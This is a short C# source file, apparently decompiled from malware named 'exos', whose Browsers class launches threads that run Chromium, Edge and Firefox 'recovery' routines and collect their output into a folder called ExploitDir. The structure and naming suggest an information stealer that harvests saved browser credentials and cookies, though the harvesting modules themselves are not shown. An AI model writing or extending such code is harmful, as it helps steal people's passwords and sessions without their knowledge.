using System;
using System.Collections.Generic;
using System.Threading;
using exos.Chromium;
using exos.Edge;
using exos.Firefox;

namespace exos;

internal class Browsers
{
	public static void Start()
	{
		string zxczxc = Helper.ExploitDir;
		List<Thread> list = new List<Thread>();
		try
		{
			list.Add(new Thread((ThreadStart)delegate
			{
				exos.Chromium.Recovery.Run(zxczxc + "\\Browsers");
				exos.Edge.Recovery.Run(zxczxc + "\\Browsers");
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				exos.Firefox.Recovery.Run(zxczxc + "\\Browsers");
			}));
			foreach (Thread item in list)
			{
				item.Start();
			}
			foreach (Thread item2 in list)
			{
				item2.Join();
			}
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
	}
}
